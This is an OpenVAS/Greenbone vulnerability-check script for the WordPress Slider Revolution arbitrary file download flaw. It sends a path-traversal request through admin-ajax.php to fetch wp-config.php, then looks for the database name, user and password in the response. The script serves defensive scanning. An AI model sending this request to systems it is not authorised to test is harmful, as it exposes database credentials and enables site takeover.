CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105070" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-09-07T06:04:54+0000" );
	script_name( "WordPress Slider Revolution Arbitrary File Download Vulnerability" );
	script_xref( name: "URL", value: "http://h3ck3rcyb3ra3na.wordpress.com/2014/08/15/wordpress-slider-revolution-responsive-4-1-4-arbitrary-file-download-0day/" );
	script_tag( name: "last_modification", value: "2021-09-07 06:04:54 +0000 (Tue, 07 Sep 2021)" );
	script_tag( name: "creation_date", value: "2014-08-21 11:02:57 +0200 (Thu, 21 Aug 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
application and the underlying system. Other attacks are also possible." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check the response" );
	script_tag( name: "solution", value: "Ask the vendor for an update" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "WordPress Slider Revolution is prone to an arbitrary file download vulnerability" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
req = http_get( item: url, port: port );
buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "DB_NAME" ) && ContainsString( buf, "DB_USER" ) && ContainsString( buf, "DB_PASSWORD" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

